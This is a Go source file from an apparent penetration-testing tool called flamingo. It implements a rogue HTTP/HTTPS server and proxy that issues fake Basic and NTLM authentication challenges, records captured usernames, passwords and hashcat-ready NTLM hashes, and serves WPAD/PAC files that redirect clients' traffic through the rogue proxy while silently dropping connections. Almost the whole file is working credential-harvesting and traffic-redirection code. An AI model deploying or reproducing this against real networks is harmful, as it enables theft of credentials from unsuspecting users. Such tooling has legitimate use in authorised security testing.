package flamingo

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"

	log "github.com/sirupsen/logrus"
)

// HTTPProxyPort is the port a rogue proxy conventionally listens on, and the
// port a served PAC file points at when ConfHTTP.WPADProxy and
// ConfHTTP.WPADProxyPort are both unset.
const HTTPProxyPort uint16 = 3128

// ConfHTTP describes the options for a HTTP service
type ConfHTTP struct {
	BindPort     uint16
	BindHost     string
	BasicRealm   string
	AuthMode     string
	RecordWriter *RecordWriter
	TLS          bool
	TLSName      string
	TLSCert      string
	TLSKey       string

	// ProxyAuth turns this listener into a rogue HTTP proxy: every request
	// is answered with 407 Proxy Authentication Required and credentials
	// are taken from Proxy-Authorization instead of Authorization. Nothing
	// is ever forwarded upstream.
	ProxyAuth bool

	// ServeWPAD enables serving a proxy auto-config file at /wpad.dat,
	// /wpad.da and any *.pac path. This is active redirection — it tells
	// the client to send its traffic somewhere else — so it is off by
	// default and has to be turned on deliberately, the same posture
	// --poison-broadcast takes for answering broadcast name queries.
	ServeWPAD bool

	// WPADProxy overrides the proxy address written into the served PAC
	// file. It may be a bare host or host:port; without a port,
	// WPADProxyPort is appended. Empty means "the address this client used
	// to reach this listener", which is normally what the operator wants.
	WPADProxy string

	// WPADProxyPort is the port used when WPADProxy carries no port of its
	// own. Zero means HTTPProxyPort.
	WPADProxyPort uint16

	shutdown bool
	listener net.Listener
	server   *http.Server
	m        sync.Mutex
}

// protoName is the protocol label recorded for this listener.
func (c *ConfHTTP) protoName() string {
	name := "http"
	if c.TLS {
		name = "https"
	}
	if c.ProxyAuth {
		name += "-proxy"
	}
	return name
}

// serverAddr is the listener address recorded alongside every observation.
func (c *ConfHTTP) serverAddr() string {
	return fmt.Sprintf("%s:%d", c.BindHost, c.BindPort)
}

// IsShutdown checks to see if the service is shutting down
func (c *ConfHTTP) IsShutdown() bool {
	c.m.Lock()
	defer c.m.Unlock()
	return c.shutdown
}

// Shutdown flags the service to shut down
func (c *ConfHTTP) Shutdown() {
	c.m.Lock()
	defer c.m.Unlock()

	if !c.shutdown {
		c.shutdown = true
		timeoutCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		c.server.Shutdown(timeoutCtx)
	}
}

// NewConfHTTP creates a default configuration for the HTTP capture server
func NewConfHTTP() *ConfHTTP {
	return &ConfHTTP{
		BindPort: 389,
		BindHost: "[::]",
	}
}

// SpawnHTTP starts a logging HTTP server
func SpawnHTTP(c *ConfHTTP) error {

	c.server = &http.Server{
		IdleTimeout:  60 * time.Second,
		ReadTimeout:  60 * time.Second,
		WriteTimeout: 60 * time.Second,
		Addr:         fmt.Sprintf("%s:%d", c.BindHost, c.BindPort),
	}
	c.server.Handler = httpHandler(c)

	// Handler normal listeners
	if !c.TLS {
		listener, err := net.Listen("tcp", fmt.Sprintf("%s:%d", c.BindHost, c.BindPort))
		if err != nil {
			return fmt.Errorf("failed to listen on %s:%d (%s)", c.BindHost, c.BindPort, err)
		}
		c.listener = listener
		go startHTTP(c)
		return nil
	}

	// Handle TLS listeners
	tlsConfig, err := newServerTLSConfig(c.TLSCert, c.TLSKey, c.TLSName)
	if err != nil {
		return fmt.Errorf("failed to load tls cert for https on %s:%d (%s)", c.BindHost, c.BindPort, err)
	}

	listener, err := listenTLS("tcp", fmt.Sprintf("%s:%d", c.BindHost, c.BindPort), tlsConfig)
	if err != nil {
		return fmt.Errorf("failed to listen with tls on %s:%d (%s)", c.BindHost, c.BindPort, err)
	}
	c.listener = listener
	go startHTTP(c)
	return nil
}

func startHTTP(c *ConfHTTP) {
	log.Debugf("%s is listening on %s:%d", c.protoName(), c.BindHost, c.BindPort)
	err := c.server.Serve(c.listener)
	if err != nil {
		log.Debugf("http server exited with error %s", err)
	}

	return
}

// httpAuthScheme selects between origin-server authentication (401 /
// Authorization / WWW-Authenticate) and proxy authentication (407 /
// Proxy-Authorization / Proxy-Authenticate). The two are the same exchange
// with different header names, so one code path serves both.
type httpAuthScheme struct {
	status     int
	reqHeader  string
	respHeader string
	proxy      bool
}

var (
	httpAuthOrigin = httpAuthScheme{
		status:     http.StatusUnauthorized,
		reqHeader:  "Authorization",
		respHeader: "WWW-Authenticate",
	}
	httpAuthProxy = httpAuthScheme{
		status:     http.StatusProxyAuthRequired,
		reqHeader:  "Proxy-Authorization",
		respHeader: "Proxy-Authenticate",
		proxy:      true,
	}
)

// authScheme returns the challenge style this listener uses.
func (c *ConfHTTP) authScheme() httpAuthScheme {
	if c.ProxyAuth {
		return httpAuthProxy
	}
	return httpAuthOrigin
}

func httpHandler(c *ConfHTTP) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		scheme := c.authScheme()

		// A PAC fetch must not be challenged: WinHTTP's WPAD client does not
		// carry credentials, and a 401 there costs the whole proxy redirect.
		// The proxy listener is deliberately excluded — every request there
		// is worth a 407, and a PAC belongs on the web listener the client
		// found by name.
		if c.ServeWPAD && !c.ProxyAuth && httpIsPACPath(r.URL.Path) {
			httpServePAC(c, w, r)
			return
		}

		switch c.AuthMode {
		case "ntlm":
			if httpHandleNTLMAuth(c, scheme, w, r) {
				return
			}
		case "basic":
			if httpHandleBasicAuth(c, scheme, w, r) {
				return
			}
			// No usable credential yet: ask for one. The access record
			// below still goes out, the response is just a challenge.
			httpBasicChallenge(c, scheme, w)
		}

		pname := c.protoName()
		c.RecordWriter.Record(
			"access",
			pname,
			r.RemoteAddr,
			map[string]string{
				"_server":       c.serverAddr(),
				"agent":         r.UserAgent(),
				"path":          r.RequestURI,
				"url":           fmt.Sprintf("%s://%s%s", pname, r.Host, r.RequestURI),
				"authorization": r.Header.Get(scheme.reqHeader),
			},
		)
	}
}

func httpHandleBasicAuth(c *ConfHTTP, scheme httpAuthScheme, w http.ResponseWriter, r *http.Request) bool {
	auth := strings.TrimSpace(r.Header.Get(scheme.reqHeader))
	if len(auth) == 0 {
		return false
	}

	bits := strings.SplitN(auth, " ", 2)
	if len(bits) != 2 || len(bits[0]) == 0 || len(bits[1]) == 0 {
		return false
	}

	atype := strings.ToLower(bits[0])
	if atype != "basic" {
		return false
	}

	rawAuth, err := base64.StdEncoding.DecodeString(bits[1])
	if err != nil {
		return false
	}

	bits = strings.SplitN(string(rawAuth), ":", 2)
	if len(bits) != 2 || (len(bits[0]) == 0 && len(bits[1]) == 0) {
		return false
	}

	fields := c.requestFields(r)
	fields["username"] = bits[0]
	fields["password"] = bits[1]
	fields["method"] = "basic"
	c.RecordWriter.Record("credential", c.protoName(), r.RemoteAddr, fields)

	if scheme.proxy {
		httpProxyGiveUp(w)
	}
	return true
}

// httpBasicChallenge asks the client for Basic credentials.
func httpBasicChallenge(c *ConfHTTP, scheme httpAuthScheme, w http.ResponseWriter) {
	realm := c.BasicRealm
	if realm == "" {
		realm = "Authentication Required"
	}
	w.Header().Set(scheme.respHeader, fmt.Sprintf("Basic realm=%q", realm))
	w.WriteHeader(scheme.status)
}

// requestFields builds the record fields every HTTP observation shares.
func (c *ConfHTTP) requestFields(r *http.Request) map[string]string {
	pname := c.protoName()
	return map[string]string{
		"_server": c.serverAddr(),
		"agent":   r.UserAgent(),
		"path":    r.RequestURI,
		"url":     fmt.Sprintf("%s://%s%s", pname, r.Host, r.RequestURI),
	}
}

func httpHandleNTLMAuth(c *ConfHTTP, scheme httpAuthScheme, w http.ResponseWriter, r *http.Request) (ok bool) {

	headers := map[string]string{
		"Connection": "Keep-Alive",
		"Keep-Alive": "timeout=5, max=100",
		"Server":     "Microsoft-IIS/7.5",
	}

	for k, v := range headers {
		w.Header().Set(k, v)
	}

	// A proxy sees every method, including CONNECT and POST, and must
	// challenge all of them. An origin server only plays the NTLM dance for
	// the methods a browser or WebDAV client uses to fetch a resource.
	if !scheme.proxy {
		if r.Method == "OPTIONS" {
			// OPTIONS indicates a possible WebDAV client
			w.Header().Set("Allow", "OPTIONS,GET,HEAD,POST,PUT,DELETE,TRACE,"+
				"PROPFIND,PROPPATCH,MKCOL,COPY,MOVE,LOCK,UNLOCK")
			return
		}
		if r.Method != "GET" && r.Method != "PROPFIND" {
			w.WriteHeader(404)
			return
		}
	}

	// GETs for standard HTTP client or PROPFIND for stage 2 WebDAV
	authHeader := r.Header.Get(scheme.reqHeader)

	switch ntlmType(authHeader) {
	case -1:
		if scheme.proxy {
			// Not an NTLM header at all; ask again rather than 404, since a
			// proxy client has nowhere else to go.
			w.Header().Set(scheme.respHeader, "NTLM")
			w.WriteHeader(scheme.status)
			return
		}
		w.WriteHeader(404)
	case 0:
		w.Header().Set(scheme.respHeader, "NTLM")
		w.WriteHeader(scheme.status)
	case 1:
		clientFlags := uint32(0)
		if negotiate, err := ntlmHeaderBytes(authHeader); err == nil {
			clientFlags, _ = ParseNTLMNegotiate(negotiate)
		}
		challenge := base64.StdEncoding.EncodeToString(NTLMChallengeMessage(clientFlags))
		w.Header().Set(scheme.respHeader, fmt.Sprintf("NTLM %s", challenge))
		w.WriteHeader(scheme.status)
	case 3:
		ntlmBytes, err := ntlmHeaderBytes(authHeader)
		if err != nil {
			w.WriteHeader(404)
			return
		}
		auth, err := ParseNTLMAuthenticate(ntlmBytes)
		if err != nil {
			w.WriteHeader(404)
			return
		}
		line, _ := NTLMHashcat(auth)

		fields := c.requestFields(r)
		fields["username"] = auth.User
		fields["hashcat"] = line
		fields["method"] = "NTLMSSP"
		c.RecordWriter.Record("credential", c.protoName(), r.RemoteAddr, fields)
		ok = true

		if scheme.proxy {
			httpProxyGiveUp(w)
		}
	}
	return
}

// httpProxyGiveUp ends a captured proxy exchange. The credential is already
// recorded and nothing is forwarded, so the kindest thing to do is to drop the
// connection abruptly: a client that sees the proxy fail this way falls back to
// a direct connection and the user never notices a broken page. Resetting needs
// the raw socket; without it, a 502 at least stops the client from retrying the
// same proxy in a loop.
func httpProxyGiveUp(w http.ResponseWriter) {
	hj, ok := w.(http.Hijacker)
	if !ok {
		w.WriteHeader(http.StatusBadGateway)
		return
	}
	conn, _, err := hj.Hijack()
	if err != nil {
		w.WriteHeader(http.StatusBadGateway)
		return
	}
	defer conn.Close()
	raw := conn
	if tc, ok := raw.(*tls.Conn); ok {
		raw = tc.NetConn()
	}
	if tcp, ok := raw.(*net.TCPConn); ok {
		// Linger zero turns the close into a RST rather than a FIN.
		_ = tcp.SetLinger(0)
	}
}

// httpIsPACPath reports whether a request path is a proxy auto-config fetch.
// Windows asks for /wpad.dat; some clients truncate the extension to
// /wpad.da, and manually configured clients fetch an arbitrary *.pac.
func httpIsPACPath(path string) bool {
	p := strings.ToLower(path)
	return p == "/wpad.dat" || p == "/wpad.da" || strings.HasSuffix(p, ".pac")
}

// httpWPADProxyAddr resolves the proxy address a served PAC file points at.
// An explicit WPADProxy wins; a bare host there gains the configured proxy
// port. With nothing configured the client is sent back to the address it used
// to reach this listener, which is the address that resolved to flamingo in the
// first place.
func (c *ConfHTTP) httpWPADProxyAddr(r *http.Request) string {
	port := c.WPADProxyPort
	if port == 0 {
		port = HTTPProxyPort
	}

	if c.WPADProxy != "" {
		if _, _, err := net.SplitHostPort(c.WPADProxy); err == nil {
			return c.WPADProxy
		}
		return net.JoinHostPort(c.WPADProxy, strconv.Itoa(int(port)))
	}

	host := r.Host
	if h, _, err := net.SplitHostPort(host); err == nil {
		host = h
	}
	if host == "" {
		host = strings.Trim(c.BindHost, "[]")
	}
	if host == "" || host == "::" || host == "0.0.0.0" {
		return ""
	}
	return net.JoinHostPort(host, strconv.Itoa(int(port)))
}

// HTTPPACScript renders a proxy auto-config file that sends everything except
// local and single-label destinations through proxy, falling back to DIRECT so
// a client whose traffic we drop still reaches the internet.
func HTTPPACScript(proxy string) string {
	return "function FindProxyForURL(url, host) {\n" +
		"    if (isPlainHostName(host) ||\n" +
		"        host == \"localhost\" ||\n" +
		"        host == \"127.0.0.1\" ||\n" +
		"        shExpMatch(host, \"localhost.*\") ||\n" +
		"        shExpMatch(host, \"*.local\")) {\n" +
		"        return \"DIRECT\";\n" +
		"    }\n" +
		"    return \"PROXY " + proxy + "; DIRECT\";\n" +
		"}\n"
}

// httpServePAC answers a WPAD or .pac fetch and records the request. With no
// determinable proxy address nothing is handed out: a PAC that names no proxy
// would only break the client's name resolution for no gain.
func httpServePAC(c *ConfHTTP, w http.ResponseWriter, r *http.Request) {
	proxy := c.httpWPADProxyAddr(r)

	fields := c.requestFields(r)
	fields["wpad_proxy"] = proxy
	if proxy == "" {
		fields["wpad"] = "no proxy address, not served"
	} else {
		fields["wpad"] = "served"
	}
	c.RecordWriter.Record("access", c.protoName(), r.RemoteAddr, fields)

	if proxy == "" {
		log.Debugf("%s: no proxy address for a PAC request from %s", c.protoName(), r.RemoteAddr)
		w.WriteHeader(404)
		return
	}

	body := HTTPPACScript(proxy)
	w.Header().Set("Content-Type", "application/x-ns-proxy-autoconfig")
	w.Header().Set("Content-Length", strconv.Itoa(len(body)))
	w.WriteHeader(200)
	w.Write([]byte(body))
}

func ntlmType(header string) int {
	netNTLMMessageBytes, err := ntlmHeaderBytes(header)
	if err != nil {
		return -1
	}

	switch NTLMMessageType(netNTLMMessageBytes) {
	case NTLMTypeNegotiate:
		return 1
	case NTLMTypeAuthenticate:
		return 3
	}

	// Anything without a readable NTLMSSP header falls back to the size
	// heuristic: an empty header starts the exchange, a short blob is a
	// NEGOTIATE, a long one an AUTHENTICATE.
	size := len(netNTLMMessageBytes)
	switch {
	case size == 0:
		return 0
	case size <= 64:
		return 1
	default:
		return 3
	}
}

// ntlmHeaderBytes decodes an NTLM or Negotiate authentication header. A
// Negotiate header carries the NTLMSSP message inside a SPNEGO wrapper, which
// is unwrapped here so the rest of the code sees a bare NTLM message.
func ntlmHeaderBytes(header string) ([]byte, error) {
	b64 := header
	for _, scheme := range []string{"NTLM ", "Negotiate "} {
		if len(b64) >= len(scheme) && strings.EqualFold(b64[:len(scheme)], scheme) {
			b64 = b64[len(scheme):]
			break
		}
	}
	netNTLMMessageBytes, err := base64.StdEncoding.DecodeString(strings.TrimSpace(b64))
	if err != nil {
		return netNTLMMessageBytes, err
	}
	if len(netNTLMMessageBytes) > 0 && NTLMMessageType(netNTLMMessageBytes) == 0 {
		if inner := FindNTLMSSP(netNTLMMessageBytes); inner != nil {
			return inner, nil
		}
	}
	return netNTLMMessageBytes, err
}
